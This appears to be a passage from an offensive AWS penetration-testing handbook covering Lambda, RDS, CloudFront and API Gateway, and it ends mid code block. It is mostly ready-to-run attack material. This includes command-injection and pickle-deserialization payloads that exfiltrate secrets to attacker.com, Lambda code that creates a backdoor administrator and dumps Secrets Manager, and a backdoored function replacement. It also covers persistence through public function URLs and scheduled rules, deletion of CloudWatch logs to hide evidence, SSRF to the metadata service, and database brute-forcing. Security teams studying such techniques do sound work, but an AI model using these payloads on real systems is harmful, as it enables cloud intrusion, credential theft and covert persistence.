# List all Lambda functions (requires lambda:ListFunctions)
aws lambda list-functions

# Get detailed function information
aws lambda get-function --function-name FunctionName

# List function versions
aws lambda list-versions-by-function --function-name FunctionName

# List function aliases
aws lambda list-aliases --function-name FunctionName

# Get function configuration (includes environment variables, role)
aws lambda get-function-configuration --function-name FunctionName

# List event source mappings
aws lambda list-event-source-mappings --function-name FunctionName

# Get function policy (resource-based policy)
aws lambda get-policy --function-name FunctionName
```

**Function Discovery via Other Services:**

```bash
# List API Gateway integrations (may reference Lambda functions)
aws apigateway get-rest-apis
aws apigateway get-resources --rest-api-id api-id

# CloudWatch Logs groups (Lambda creates log groups)
aws logs describe-log-groups | grep '/aws/lambda/'

# List Lambda@Edge functions (CloudFront)
aws lambda list-functions --region us-east-1 | jq -r '.Functions[] | select(.FunctionName | contains("cloudfront"))'

# SNS topic subscriptions
aws sns list-subscriptions | jq -r '.Subscriptions[] | select(.Protocol == "lambda")'

# S3 bucket notifications
aws s3api get-bucket-notification-configuration --bucket bucket-name
```

**Unauthenticated Lambda Discovery:**

```bash
# Lambda function URLs (publicly accessible if not authenticated)
# Format: https://<function-url-id>.lambda-url.<region>.on.aws/
curl https://abcd1234.lambda-url.us-east-1.on.aws/

# API Gateway endpoints invoking Lambda
curl https://api-id.execute-api.region.amazonaws.com/stage/path

# Check for CORS misconfigurations
curl -H "Origin: http://attacker.com" -H "Access-Control-Request-Method: POST" -X OPTIONS https://lambda-url/
```

**Lambda Function URL Brute-Force:**

```bash
# Generate potential function URL patterns
# Format: [a-z0-9]{10}.lambda-url.region.on.aws
for i in {1..1000}; do
    url=$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 10)
    echo "https://${url}.lambda-url.us-east-1.on.aws/"
done > lambda_urls.txt

# Test URLs
cat lambda_urls.txt | httpx -silent -status-code -title
```

### Lambda Function Code Analysis

**Function Code Download:**

```bash
# Download function code (requires lambda:GetFunction)
aws lambda get-function --function-name FunctionName --query 'Code.Location' --output text | xargs curl -o function.zip

# Extract and analyze
unzip function.zip
ls -la

# Common file structures:
# - Node.js: index.js, package.json, node_modules/
# - Python: lambda_function.py, requirements.txt
# - Java: .jar or .class files
# - Go: compiled binary
```

**Static Code Analysis:**

```bash
# Search for hardcoded credentials
grep -r "AKIA" ./lambda_code/
grep -r "password\|secret\|api_key\|token" -i ./lambda_code/
grep -r "aws_access_key_id\|aws_secret_access_key" ./lambda_code/

# Check for vulnerable dependencies (Node.js)
cd lambda_code && npm audit

# Python dependencies
pip install safety
safety check -r requirements.txt

# Search for SQL injection vulnerabilities
grep -r "execute\|query" ./lambda_code/ | grep -v "parameterized"

# Command injection patterns
grep -r "exec\|system\|spawn\|eval" ./lambda_code/

# Path traversal vulnerabilities
grep -r "open\|readFile\|createReadStream" ./lambda_code/ | grep -v "path.join"

# SSRF vulnerabilities
grep -r "request\|fetch\|http.get\|urllib" ./lambda_code/
```

**Environment Variable Extraction:**

```bash
# Get function configuration (includes env vars)
aws lambda get-function-configuration --function-name FunctionName | jq .Environment

# Environment variables may contain:
# - Database connection strings
# - API keys
# - Secrets Manager ARNs
# - S3 bucket names
# - Internal service URLs

# Extract specific variables
aws lambda get-function-configuration --function-name FunctionName --query 'Environment.Variables' | jq -r 'to_entries[] | "\(.key)=\(.value)"'
```

### Lambda IAM Role Exploitation

**Role Analysis:**

```bash
# Get function's execution role
ROLE_ARN=$(aws lambda get-function-configuration --function-name FunctionName --query 'Role' --output text)

# Extract role name from ARN
ROLE_NAME=$(echo $ROLE_ARN | awk -F'/' '{print $NF}')

# Get role policies
aws iam list-attached-role-policies --role-name $ROLE_NAME
aws iam list-role-policies --role-name $ROLE_NAME

# Get policy document
POLICY_ARN=$(aws iam list-attached-role-policies --role-name $ROLE_NAME --query 'AttachedPolicies[0].PolicyArn' --output text)
aws iam get-policy --policy-arn $POLICY_ARN
aws iam get-policy-version --policy-arn $POLICY_ARN --version-id v1 | jq .PolicyVersion.Document

# Check for overly permissive policies
aws iam get-policy-version --policy-arn $POLICY_ARN --version-id v1 | jq '.PolicyVersion.Document' | grep -E '(\*.*\*|Action.*\*)'
```

**Invoke Lambda to Obtain Role Credentials:**

```bash
# Create exploit function that returns credentials
cat > exploit.py <<EOF
import json
import urllib.request

def lambda_handler(event, context):
    # Lambda execution context provides role credentials via environment
    # But cannot directly access them from within the function
    # Instead, make request to metadata service if applicable
    
    # Alternative: Use boto3 to access AWS services with the role
    import boto3
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Access resources based on event data
    if 'command' in event:
        if event['command'] == 'list_s3':
            s3 = boto3.client('s3')
            return {'buckets': [b['Name'] for b in s3.list_buckets()['Buckets']]}
        elif event['command'] == 'read_file':
            s3 = boto3.client('s3')
            bucket = event.get('bucket')
            key = event.get('key')
            obj = s3.get_object(Bucket=bucket, Key=key)
            return {'content': obj['Body'].read().decode('utf-8')}
    
    return {'identity': identity}
EOF

zip exploit.zip exploit.py

# Update existing function code (if you have lambda:UpdateFunctionCode)
aws lambda update-function-code --function-name TargetFunction --zip-file fileb://exploit.zip

# Invoke function
aws lambda invoke --function-name TargetFunction --payload '{"command":"list_s3"}' response.json
cat response.json
```

**Lambda Layer Exploitation:**

```bash
# List function layers
aws lambda get-function-configuration --function-name FunctionName --query 'Layers'

# Get layer version details
aws lambda get-layer-version --layer-name LayerName --version-number 1

# Download layer code
aws lambda get-layer-version --layer-name LayerName --version-number 1 --query 'Content.Location' --output text | xargs curl -o layer.zip

# Extract and analyze (may contain shared secrets, libraries with vulnerabilities)
unzip layer.zip -d layer_content/
grep -r "AKIA\|password\|secret" layer_content/
```

### Lambda Function Invocation Exploitation

**Direct Invocation:**

```bash
# Invoke function (requires lambda:InvokeFunction)
aws lambda invoke --function-name FunctionName --payload '{"key":"value"}' response.json
cat response.json

# Synchronous invocation (default)
aws lambda invoke --function-name FunctionName --invocation-type RequestResponse --payload '{"test":"data"}' output.json

# Asynchronous invocation
aws lambda invoke --function-name FunctionName --invocation-type Event --payload '{"test":"data"}' output.json

# Dry run (test permissions without execution)
aws lambda invoke --function-name FunctionName --invocation-type DryRun --payload '{}' output.json
```

**Payload Injection Attacks:**

**Command Injection:**

```bash
# If Lambda function executes shell commands based on input
# Example vulnerable code (Python):
# import subprocess
# subprocess.call(f"echo {event['message']}", shell=True)

# Exploit payload
aws lambda invoke --function-name VulnerableFunction --payload '{"message":"test; curl http://attacker.com/exfil?data=$(cat /tmp/secrets)"}' output.json

# Extract environment variables
aws lambda invoke --function-name VulnerableFunction --payload '{"message":"test; env > /tmp/env.txt && cat /tmp/env.txt"}' output.json
```

**SQL Injection:**

```bash
# If Lambda constructs SQL queries from input
# Example vulnerable code:
# cursor.execute(f"SELECT * FROM users WHERE id = {event['user_id']}")

# Exploit payload
aws lambda invoke --function-name VulnerableFunction --payload '{"user_id":"1 UNION SELECT password FROM admin_users--"}' output.json
```

**Path Traversal:**

```bash
# If Lambda reads files based on input
# Example vulnerable code:
# with open(f"/var/task/data/{event['filename']}", 'r') as f:

# Exploit payload
aws lambda invoke --function-name VulnerableFunction --payload '{"filename":"../../../../etc/passwd"}' output.json

# Read Lambda function code itself
aws lambda invoke --function-name VulnerableFunction --payload '{"filename":"../../../../var/task/lambda_function.py"}' output.json
```

**SSRF via Lambda:**

```bash
# If Lambda makes HTTP requests based on input
# Example vulnerable code:
# response = requests.get(event['url'])

# Exploit to access IMDS
aws lambda invoke --function-name VulnerableFunction --payload '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' output.json

# Exploit to scan internal network
aws lambda invoke --function-name VulnerableFunction --payload '{"url":"http://internal-service.local/admin"}' output.json
```

**XXE Injection:**

```bash
# If Lambda parses XML input
# Exploit payload
cat > xxe_payload.json <<EOF
{
  "xml_data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
}
EOF

aws lambda invoke --function-name XMLParsingFunction --payload file://xxe_payload.json output.json
```

**Deserialization Attacks:**

```bash
# If Lambda deserializes untrusted input (Python pickle, Java serialization, etc.)
# Generate malicious pickle payload (Python example)
cat > generate_pickle.py <<EOF
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/exfil?data=$(cat /tmp/secrets)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
EOF

python3 generate_pickle.py > pickle_payload.txt

# Send payload
aws lambda invoke --function-name DeserializeFunction --payload '{"data":"'$(cat pickle_payload.txt)'"}' output.json
```

### Lambda Event Source Exploitation

**S3 Event Triggers:**

```bash
# If Lambda is triggered by S3 events, upload malicious files

# Check S3 bucket notification configuration
aws s3api get-bucket-notification-configuration --bucket bucket-name

# Upload file to trigger Lambda
aws s3 cp malicious.xml s3://bucket-name/uploads/malicious.xml

# File content designed to exploit Lambda processing (XXE, command injection, etc.)
cat > malicious.xml <<EOF
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/task/config.json">]>
<data>&xxe;</data>
EOF
```

**API Gateway Integration:**

```bash
# Test API Gateway endpoints that trigger Lambda
curl -X POST https://api-id.execute-api.region.amazonaws.com/prod/endpoint \
  -H "Content-Type: application/json" \
  -d '{"test":"injection; curl http://attacker.com/"}'

# Test for authentication bypass
curl -X POST https://api-id.execute-api.region.amazonaws.com/prod/admin \
  -H "Authorization: Bearer invalid_token" \
  -d '{"action":"sensitive_operation"}'

# CORS misconfiguration testing
curl -H "Origin: http://attacker.com" https://api-id.execute-api.region.amazonaws.com/prod/endpoint -v
```

**DynamoDB Streams:**

```bash
# If Lambda processes DynamoDB stream events
# Insert malicious data into DynamoDB table
aws dynamodb put-item --table-name TargetTable --item '{
  "id": {"S": "malicious"},
  "data": {"S": "'; DROP TABLE users; --"}
}'

# Lambda may process this without sanitization
```

**SQS Queue Messages:**

```bash
# If Lambda consumes SQS messages
aws sqs send-message --queue-url https://sqs.region.amazonaws.com/account/queue-name \
  --message-body '{"command":"$(curl http://attacker.com/exfil?data=$(env))"}'

# Send large messages to cause DoS
aws sqs send-message --queue-url https://sqs.region.amazonaws.com/account/queue-name \
  --message-body "$(python3 -c 'print("A"*262144)')"  # Max SQS message size
```

### Lambda Privilege Escalation

**PassRole to Lambda:**

```bash
# If attacker has lambda:CreateFunction and iam:PassRole
# Create Lambda with privileged execution role

cat > privesc.py <<EOF
import boto3
import json

def lambda_handler(event, context):
    command = event.get('command')
    
    if command == 'create_admin':
        iam = boto3.client('iam')
        # Create new admin user
        iam.create_user(UserName='BackdoorAdmin')
        iam.attach_user_policy(
            UserName='BackdoorAdmin',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        response = iam.create_access_key(UserName='BackdoorAdmin')
        return response['AccessKey']
    
    elif command == 'exfil_secrets':
        secrets = boto3.client('secretsmanager')
        secret_list = secrets.list_secrets()
        results = []
        for secret in secret_list['SecretList']:
            secret_value = secrets.get_secret_value(SecretId=secret['ARN'])
            results.append({
                'name': secret['Name'],
                'value': secret_value.get('SecretString', 'N/A')
            })
        return results
    
    return {'status': 'unknown command'}
EOF

zip privesc.zip privesc.py

aws lambda create-function \
    --function-name PrivEscFunction \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT_ID:role/HighPrivilegedRole \
    --handler privesc.lambda_handler \
    --zip-file fileb://privesc.zip

# Invoke to escalate
aws lambda invoke --function-name PrivEscFunction --payload '{"command":"create_admin"}' admin_creds.json
cat admin_creds.json
```

**UpdateFunctionCode for Code Injection:**

```bash
# If attacker has lambda:UpdateFunctionCode on existing function
# Replace function code with malicious version

cat > backdoor.py <<EOF
import boto3

def lambda_handler(event, context):
    # Original functionality to avoid detection
    original_response = {"status": "success"}
    
    # Backdoor functionality
    if event.get('backdoor') == True:
        s3 = boto3.client('s3')
        # Exfiltrate data
        buckets = s3.list_buckets()
        for bucket in buckets['Buckets']:
            try:
                objects = s3.list_objects_v2(Bucket=bucket['Name'], MaxKeys=10)
                # Send to attacker server
            except:
                pass
    
    return original_response
EOF

zip backdoor.zip backdoor.py

aws lambda update-function-code --function-name LegitFunction --zip-file fileb://backdoor.zip

# Invoke with backdoor trigger
aws lambda invoke --function-name LegitFunction --payload '{"backdoor":true}' output.json
```

**Environment Variable Manipulation:**

```bash
# If attacker has lambda:UpdateFunctionConfiguration
# Inject malicious environment variables

aws lambda update-function-configuration \
    --function-name TargetFunction \
    --environment "Variables={MALICIOUS_URL=http://attacker.com/exfil,ORIGINAL_VAR=value}"

# Function may use environment variables unsafely:
# Example vulnerable code:
# malicious_url = os.environ.get('MALICIOUS_URL')
# requests.post(malicious_url, data=sensitive_data)
```

### Lambda Persistence Mechanisms

**Event Source Mapping:**

```bash
# Create event source mapping to trigger backdoor function
aws lambda create-event-source-mapping \
    --function-name BackdoorFunction \
    --event-source-arn arn:aws:sqs:region:account:queue-name \
    --enabled

# Lambda will be invoked for every message in queue
```

**Lambda Function URL:**

```bash
# Create public function URL for persistent access
aws lambda create-function-url-config \
    --function-name BackdoorFunction \
    --auth-type NONE \
    --cors '{
        "AllowOrigins": ["*"],
        "AllowMethods": ["*"],
        "AllowHeaders": ["*"]
    }'

# Get function URL
aws lambda get-function-url-config --function-name BackdoorFunction

# URL can be accessed publicly for persistent backdoor
```

**Scheduled Invocation (EventBridge):**

```bash
# Create EventBridge rule to invoke function periodically
aws events put-rule \
    --name BackdoorSchedule \
    --schedule-expression "rate(1 hour)" \
    --state ENABLED

aws events put-targets \
    --rule BackdoorSchedule \
    --targets "Id"="1","Arn"="arn:aws:lambda:region:account:function:BackdoorFunction"

# Grant EventBridge permission to invoke
aws lambda add-permission \
    --function-name BackdoorFunction \
    --statement-id AllowEventBridge \
    --action lambda:InvokeFunction \
    --principal events.amazonaws.com \
    --source-arn arn:aws:events:region:account:rule/BackdoorSchedule
```

### Lambda Security Monitoring Evasion

**CloudWatch Logs Manipulation:**

```bash
# If function has logs:PutLogEvents permission, can forge logs
# Or if has logs:DeleteLogGroup, can delete evidence

# Delete log group (requires logs:DeleteLogGroup)
aws logs delete-log-group --log-group-name /aws/lambda/TargetFunction

# Log group will be recreated on next invocation, but historical logs are gone
```

**VPC Lambda for Network Isolation:**

```bash
# Lambda in VPC may bypass network monitoring
# Check if function is VPC-attached
aws lambda get-function-configuration --function-name FunctionName --query 'VpcConfig'

# VPC-attached Lambda can access internal resources without traversing monitored paths
```

**Dead Letter Queue (DLQ) Inspection:**

```bash
# Check if function has DLQ configured (may contain failed invocation data)
aws lambda get-function-configuration --function-name FunctionName --query 'DeadLetterConfig'

# Access DLQ to read failed invocations (may reveal sensitive data)
aws sqs receive-message --queue-url https://sqs.region.amazonaws.com/account/dlq-name
```

### Lambda in CTF Scenarios

[Inference] Common CTF Lambda exploitation patterns:

**Scenario 1: Public Function URL with Injection**

```bash
# Discover function URL
curl https://abcd1234.lambda-url.us-east-1.on.aws/

# Test for command injection
curl -X POST https://abcd1234.lambda-url.us-east-1.on.aws/ \
  -H "Content-Type: application/json" \
  -d '{"input":"test; cat /tmp/flag.txt"}'

# Extract flag via DNS exfiltration (if outbound blocked)
curl -X POST https://abcd1234.lambda-url.us-east-1.on.aws/ \
  -H "Content-Type: application/json" \
  -d '{"input":"test; FLAG=$(cat /tmp/flag.txt); nslookup $FLAG.attacker.com"}'
```

**Scenario 2: Environment Variable Flag**

```bash
# If you have lambda:GetFunctionConfiguration
aws lambda get-function-configuration --function-name ctf-function | jq .Environment

# Flag may be in environment variable
# {"FLAG": "flag{...}", "DATABASE_URL": "..."}
```

**Scenario 3: Layer-Based Flag**

```bash
# Download all layers
aws lambda get-function-configuration --function-name ctf-function --query 'Layers[].Arn' --output text | while read layer_arn; do
    version=$(echo $layer_arn | awk -F':' '{print $NF}')
    layer_name=$(echo $layer_arn | awk -F':' '{print $(NF-1)}')
    aws lambda get-layer-version-by-arn --arn $layer_arn --query 'Content.Location' --output text | xargs curl -o ${layer_name}.zip
done

# Extract and search
unzip -q "*.zip" -d layers/
grep -r "flag{" layers/
```

**Scenario 4: SSRF to Internal Services**

```bash
# Lambda function proxies requests
curl -X POST https://api.ctf.com/proxy \
  -d '{"url":"http://internal-flag-service.local/flag"}'

# Or SSRF to metadata service (if Lambda on EC2/Container)
curl -X POST https://api.ctf.com/proxy \
  -d '{"url":"http://169.254.169.254/latest/user-data"}'
```

---

## Important Related Topics

Consider exploring these interconnected AWS security testing areas:

- **CloudFormation/Terraform State File Exploitation** - Infrastructure-as-Code secrets exposure
- **Secrets Manager and Parameter Store Extraction** - Credential storage service enumeration
- **RDS and DynamoDB Security Testing** - Database service misconfigurations
- **ECS/EKS Container Escape** - Container orchestration exploitation
- **CloudTrail Log Analysis and Evasion** - Audit logging bypass techniques
- **Cognito Authentication Bypass** - Identity service vulnerabilities
- **API Gateway Misconfigurations** - API security testing specific to AWS

---

## RDS/Database Exposure

### RDS Instance Enumeration

**Identifying Exposed RDS Instances**

```bash
# Enumerate RDS instances in a region
aws rds describe-db-instances --region us-east-1

# List all RDS instances across all regions
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "Region: $region"
  aws rds describe-db-instances --region $region --query 'DBInstances[*].[DBInstanceIdentifier,Engine,Endpoint.Address,PubliclyAccessible]' --output table
done

# Check for publicly accessible databases
aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address,Endpoint.Port,Engine]' --output table
```

**Security Group Analysis**

```bash
# Identify security groups attached to RDS instances
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,VpcSecurityGroups[*].VpcSecurityGroupId]' --output table

# Examine security group rules for specific RDS instance
SG_ID="sg-xxxxxxxxx"
aws ec2 describe-security-groups --group-ids $SG_ID --query 'SecurityGroups[*].IpPermissions[*].[FromPort,ToPort,IpProtocol,IpRanges[*].CidrIp]' --output table

# Find overly permissive rules (0.0.0.0/0)
aws ec2 describe-security-groups --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" --query 'SecurityGroups[*].[GroupId,GroupName,IpPermissions[*].[FromPort,ToPort]]' --output table
```

### RDS Snapshot Exposure

**Snapshot Enumeration**

```bash
# List all RDS snapshots
aws rds describe-db-snapshots --snapshot-type public --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier,SnapshotCreateTime]' --output table

# Check snapshot attributes for public access
aws rds describe-db-snapshot-attributes --db-snapshot-identifier snapshot-name

# Find publicly shared snapshots (major vulnerability)
aws rds describe-db-snapshots --include-public --query 'DBSnapshots[?PubliclyAccessible==`true`].[DBSnapshotIdentifier,DBInstanceIdentifier]' --output table
```

**Exploiting Public Snapshots**

```bash
# Restore a publicly accessible snapshot
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier restored-instance \
  --db-snapshot-identifier public-snapshot-id \
  --publicly-accessible

# Create read replica from snapshot
aws rds create-db-instance-read-replica \
  --db-instance-identifier replica-instance \
  --source-db-instance-identifier source-instance
```

### Database Connection Testing

**Direct Connection Attempts**

```bash
# MySQL/MariaDB RDS connection
mysql -h database-instance.region.rds.amazonaws.com -P 3306 -u admin -p

# PostgreSQL RDS connection
psql -h database-instance.region.rds.amazonaws.com -p 5432 -U postgres -d database_name

# MSSQL RDS connection (using mssql-cli)
mssql-cli -S database-instance.region.rds.amazonaws.com -U admin -P password

# Test for default credentials
hydra -L users.txt -P passwords.txt mysql://database-instance.region.rds.amazonaws.com
```

**Nmap RDS Reconnaissance**

```bash
# Scan RDS endpoint
nmap -sV -p 3306,5432,1433 database-instance.region.rds.amazonaws.com

# Script scan for database vulnerabilities
nmap -p 3306 --script mysql-enum,mysql-audit,mysql-databases database-instance.region.rds.amazonaws.com

# PostgreSQL enumeration
nmap -p 5432 --script pgsql-brute,pgsql-databases database-instance.region.rds.amazonaws.com
```

### IAM Database Authentication Exploitation

**IAM Token Generation**

```bash
# Generate authentication token for RDS MySQL
aws rds generate-db-auth-token \
  --hostname database-instance.region.rds.amazonaws.com \
  --port 3306 \
  --username db_user \
  --region us-east-1

# Connect using IAM authentication
mysql -h database-instance.region.rds.amazonaws.com \
  --port=3306 \
  --ssl-ca=/path/to/rds-ca-bundle.pem \
  --ssl-mode=REQUIRED \
  --user=db_user \
  --password=$(aws rds generate-db-auth-token --hostname database-instance.region.rds.amazonaws.com --port 3306 --username db_user --region us-east-1)
```

### Parameter Group Exploitation

```bash
# List parameter groups
aws rds describe-db-parameter-groups

# Examine parameter values
aws rds describe-db-parameters --db-parameter-group-name custom-param-group

# Check for insecure configurations
aws rds describe-db-parameters --db-parameter-group-name default.mysql8.0 --query 'Parameters[?ParameterName==`log_bin_trust_function_creators`]'
```

---

## CloudFront Bypass Techniques

### Origin Discovery

**Finding Origin Servers**

```bash
# DNS enumeration for origin
dig target-cloudfront.net
dig distribution-id.cloudfront.net

# Certificate transparency logs for origin
curl -s "https://crt.sh/?q=%.target-domain.com&output=json" | jq -r '.[].name_value' | sort -u

# Historical DNS records
curl -s "https://securitytrails.com/list/apex_domain/target-domain.com"

# Shodan searches for origin IP
shodan search "ssl.cert.subject.CN:target-domain.com" --fields ip_str,port,org
```

**CloudFront Distribution Enumeration**

```bash
# List CloudFront distributions
aws cloudfront list-distributions --query 'DistributionList.Items[*].[Id,DomainName,Origins.Items[0].DomainName]' --output table

# Get specific distribution configuration
aws cloudfront get-distribution --id DISTRIBUTION_ID

# Check origin protocol policy
aws cloudfront get-distribution-config --id DISTRIBUTION_ID --query 'DistributionConfig.Origins.Items[*].[DomainName,CustomOriginConfig.OriginProtocolPolicy]'
```

### Origin IP Bypass Methods

**Direct Origin Access**

```bash
# Test direct origin access
curl -H "Host: target-domain.com" http://origin-ip-address/

# Bypass with various Host headers
curl -H "Host: target-domain.com" http://origin-server.example.com/
curl -H "Host: www.target-domain.com" http://origin-server.example.com/
curl -H "Host: admin.target-domain.com" http://origin-server.example.com/

# Test with X-Forwarded-Host
curl -H "X-Forwarded-Host: target-domain.com" http://origin-ip/

# Origin access with SNI manipulation
openssl s_client -connect origin-ip:443 -servername target-domain.com
```

**IP Range Scanning for Origins**

```bash
# Scan AWS IP ranges for potential origins
wget https://ip-ranges.amazonaws.com/ip-ranges.json

# Extract specific region/service IPs
jq -r '.prefixes[] | select(.service=="EC2" and .region=="us-east-1") | .ip_prefix' ip-ranges.json > aws-ips.txt

# Masscan for web servers
masscan -iL aws-ips.txt -p80,443,8080,8443 --rate=10000 -oL scan-results.txt

# Check for target application
while read ip; do
  response=$(curl -s -H "Host: target-domain.com" http://$ip/ -m 5)
  if echo "$response" | grep -q "specific-app-string"; then
    echo "Potential origin: $ip"
  fi
done < potential-origins.txt
```

### CloudFront-Specific Header Manipulation

**CloudFront Viewer/Origin Headers**

```bash
# Test CloudFront-specific headers
curl -H "CloudFront-Viewer-Country: US" https://distribution.cloudfront.net/
curl -H "CloudFront-Is-Desktop-Viewer: true" https://distribution.cloudfront.net/
curl -H "CloudFront-Is-Mobile-Viewer: false" https://distribution.cloudfront.net/

# Geographic restriction bypass attempts
curl -H "X-Forwarded-For: allowed-country-ip" https://distribution.cloudfront.net/
curl -H "CloudFront-Viewer-Country: US" https://distribution.cloudfront.net/

# Inject via CloudFront-Forwarded-Proto
curl -H "CloudFront-Forwarded-Proto: https" https://distribution.cloudfront.net/
```

**Custom Origin Header Exploitation**

```bash
# If custom origin headers are configured, test variations
curl -H "X-Custom-Origin-Header: expected-value" http://origin-ip/
curl -H "X-Origin-Verify: secret-token" http://origin-ip/

# AWS CLI to check configured origin custom headers
aws cloudfront get-distribution-config --id DIST_ID --query 'DistributionConfig.Origins.Items[*].CustomHeaders'
```

### Cache Poisoning Attacks

**Cache Key Manipulation**

```bash
# Test cache key parameters
curl "https://distribution.cloudfront.net/path?param1=value1&param2=value2"
curl "https://distribution.cloudfront.net/path?param2=value2&param1=value1"

# Header-based cache poisoning
curl -H "X-Forwarded-Host: malicious.com" https://distribution.cloudfront.net/
curl -H "X-Original-URL: /admin" https://distribution.cloudfront.net/

# Test unkeyed headers
for header in "X-Forwarded-Host" "X-Original-URL" "X-Rewrite-URL" "Forwarded"; do
  echo "Testing: $header"
  curl -H "$header: evil.com" https://distribution.cloudfront.net/
done
```

**Web Cache Deception**

```bash
# Path confusion attacks
curl "https://distribution.cloudfront.net/profile.php/static.css"
curl "https://distribution.cloudfront.net/api/user/data.json;.jpg"
curl "https://distribution.cloudfront.net/private/data%23.css"

# Extension manipulation
curl "https://distribution.cloudfront.net/sensitive-endpoint?param=value%00.jpg"
```

### Signed URL/Cookie Bypass

**CloudFront Signed URL Structure**

[Inference] Signed URLs typically contain: `Expires`, `Signature`, and `Key-Pair-Id` parameters. Testing involves parameter manipulation, but signature verification usually prevents direct tampering without the private key.

```bash
# Example signed URL structure
# https://distribution.cloudfront.net/content.mp4?Expires=1234567890&Signature=ABC...&Key-Pair-Id=APKA...

# Attempt parameter order manipulation
curl "https://distribution.cloudfront.net/content.mp4?Key-Pair-Id=APKA...&Signature=ABC...&Expires=1234567890"

# Test with modified resource path
curl "https://distribution.cloudfront.net/../other-content.mp4?Expires=1234567890&Signature=ABC...&Key-Pair-Id=APKA..."

# Replay attack with valid signature on different content
curl "https://distribution.cloudfront.net/different-file.mp4?Expires=1234567890&Signature=ABC...&Key-Pair-Id=APKA..."
```

**Signed Cookie Manipulation**

```bash
# Extract CloudFront cookies
curl -c cookies.txt "https://distribution.cloudfront.net/"

# Cookie format: CloudFront-Policy, CloudFront-Signature, CloudFront-Key-Pair-Id
grep CloudFront cookies.txt

# Test cookie reuse across paths
curl -b cookies.txt "https://distribution.cloudfront.net/restricted-content/"

# Wildcard policy exploitation
# If policy uses wildcards, test scope
curl -b "CloudFront-Policy=...; CloudFront-Signature=...; CloudFront-Key-Pair-Id=..." \
  "https://distribution.cloudfront.net/unintended-path/"
```

### Origin Access Identity (OAI) Bypass

**S3 Origin Testing**

```bash
# Identify S3 bucket origin
aws cloudfront get-distribution --id DIST_ID --query 'Distribution.DistributionConfig.Origins.Items[*].[DomainName,S3OriginConfig.OriginAccessIdentity]'

# Test direct S3 access
aws s3 ls s3://bucket-name/ --no-sign-request
curl https://bucket-name.s3.amazonaws.com/

# Enumerate S3 bucket through CloudFront errors
curl https://distribution.cloudfront.net/nonexistent-file
# Error messages may reveal bucket name

# Test authenticated S3 access if credentials available
aws s3 ls s3://bucket-name/ --profile compromised-profile
```

---

## API Gateway Testing

### API Enumeration

**Discovering API Gateway Endpoints**

```bash
# List API Gateway REST APIs
aws apigateway get-rest-apis --query 'items[*].[id,name,createdDate]' --output table

# Get specific API details
aws apigateway get-rest-api --rest-api-id API_ID

# List all resources/endpoints
aws apigateway get-resources --rest-api-id API_ID --query 'items[*].[path,resourceMethods]' --output table

# Export API definition
aws apigateway get-export --rest-api-id API_ID --stage-name prod --export-type swagger swagger.json
```

**Stage Discovery**

```bash
# List deployment stages
aws apigateway get-stages --rest-api-id API_ID

# Get stage configuration
aws apigateway get-stage --rest-api-id API_ID --stage-name prod

# Common stage names to test
for stage in "prod" "production" "dev" "development" "test" "staging" "v1" "v2"; do
  curl -s -o /dev/null -w "%{http_code}" "https://API_ID.execute-api.region.amazonaws.com/$stage/"
done
```

### Authorization Bypass Techniques

**IAM Authorization Testing**

```bash
# Test without credentials
curl https://API_ID.execute-api.region.amazonaws.com/prod/resource

# Generate signed request with compromised credentials
aws apigateway test-invoke-method \
  --rest-api-id API_ID \
  --resource-id RESOURCE_ID \
  --http-method GET \
  --path-with-query-string "/resource?param=value"

# AWS SigV4 signing for direct API calls
awscurl --service execute-api --region us-east-1 \
  https://API_ID.execute-api.region.amazonaws.com/prod/resource
```

**Lambda Authorizer Bypass**

```bash
# Test authorization header variations
curl -H "Authorization: Bearer valid-token" https://api.example.com/resource
curl -H "Authorization: bearer valid-token" https://api.example.com/resource
curl -H "authorization: Bearer valid-token" https://api.example.com/resource

# Token manipulation
curl -H "Authorization: Bearer null" https://api.example.com/resource
curl -H "Authorization: Bearer undefined" https://api.example.com/resource
curl -H "Authorization: " https://api.example.com/resource

# Array/object injection in token
curl -H "Authorization: Bearer ['valid-token']" https://api.example.com/resource
curl -H "Authorization: Bearer {\"token\":\"valid-token\"}" https://api.example.com/resource

# JWT token manipulation (if JWT-based)
# Use jwt_tool for automated testing
python3 jwt_tool.py TOKEN -t https://api.example.com/resource -rc "Authorization: Bearer TOKEN"
```

**Cognito User Pool Bypass**

```bash
# Test with expired token
curl -H "Authorization: Bearer expired-token" https://api.example.com/resource

# Test without required scopes
curl -H "Authorization: Bearer limited-scope-token" https://api.example.com/admin-resource

# Enumerate Cognito User Pool
aws cognito-idp list-user-pools --max-results 60

# Get User Pool clients
aws cognito-idp list-user-pool-clients --user-pool-id POOL_ID
```

### Resource Policy Exploitation

```bash
# Get resource policy for API
aws apigateway get-rest-api --rest-api-id API_ID --query 'policy'

# Test IP-based restrictions
curl -H "X-Forwarded-For: allowed-ip" https://api.example.com/resource
curl -H "X-Real-IP: allowed-ip" https://api.example.com/resource

# VPC endpoint bypass attempts
# If policy restricts to VPC endpoints, test from VPC or attempt SSRF
curl https://vpce-xxx.execute-api.region.vpce.amazonaws.com/prod/resource
```

### API Gateway-Specific Attack Vectors

**HTTP Method Override**

```bash
# Test method override headers
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.example.com/resource/123
curl -X GET -H "X-HTTP-Method-Override: PUT" https://api.example.com/resource/123
curl -X POST -H "X-Method-Override: PATCH" https://api.example.com/resource/123

# Use different override headers
for header in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do
  curl -X GET -H "$header: DELETE" https://api.example.com/resource/123
done
```

**Request/Response Mapping Exploitation**

```bash
